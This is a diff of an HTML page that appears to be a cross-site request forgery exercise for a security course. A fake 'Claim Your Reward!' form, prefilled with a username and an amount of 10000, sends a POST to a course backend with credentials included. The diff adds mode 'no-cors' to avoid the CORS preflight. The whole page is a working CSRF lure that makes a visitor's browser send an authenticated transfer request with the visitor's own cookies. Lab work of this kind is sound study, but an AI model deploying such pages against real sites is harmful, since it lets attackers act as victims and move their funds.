@@ -3,59 +3,46 @@
   <h1>Claim Your Reward!</h1>
   <p>Fill out the details below:</p>
 
-  <!-- Input fields for user data -->
   <form id="rewardForm">
     <label for="username">Username:</label>
-    <input type="text" id="username" name="username" value="ljl5837"><br><br>
+    <input type="text" id="username" value="ljl5837"><br><br>
 
     <label for="fname">First Name:</label>
-    <input type="text" id="fname" name="fname" value="lks"><br><br>
+    <input type="text" id="fname" value="lks"><br><br>
 
     <label for="amount">Amount:</label>
-    <input type="number" id="amount" name="amount" value="10000"><br><br>
+    <input type="number" id="amount" value="10000"><br><br>
 
     <label for="comment">Comment:</label>
-    <input type="text" id="comment" name="comment" value="what's your name"><br><br>
+    <input type="text" id="comment" value="what's your name"><br><br>
 
     <button type="button" onclick="submitForm()">Submit</button>
   </form>
 
   <script>
     function submitForm() {
-      // Collect input values
-      const username = document.getElementById('username').value;
-      const fname = document.getElementById('fname').value;
-      const amount = document.getElementById('amount').value;
-      const comment = document.getElementById('comment').value;
-
-      // Create JSON payload
       const jsonPayload = JSON.stringify({
-        username: username,
-        fname: fname,
-        amount: amount,
-        comment: comment
+        username: document.getElementById('username').value,
+        fname: document.getElementById('fname').value,
+        amount: document.getElementById('amount').value,
+        comment: document.getElementById('comment').value,
       });
 
-      // Send JSON payload using fetch
       fetch('https://cse543.aranjbar.me/backend/tfourtwo', {
         method: 'POST',
+        mode: 'no-cors', // Disable CORS preflight
         headers: {
           'Content-Type': 'application/json'
         },
         body: jsonPayload,
-        credentials: 'include' // Ensures cookies are sent with the request
+        credentials: 'include' // Include session cookies
       })
-        .then(response => {
-          if (response.ok) {
-            alert('Request sent successfully!');
-          } else {
-            alert('Failed to send request.');
-          }
-        })
-        .catch(error => {
-          console.error('Error:', error);
-          alert('An error occurred.');
-        });
+      .then(() => {
+        alert('Request sent!');
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
     }
   </script>
 </body>
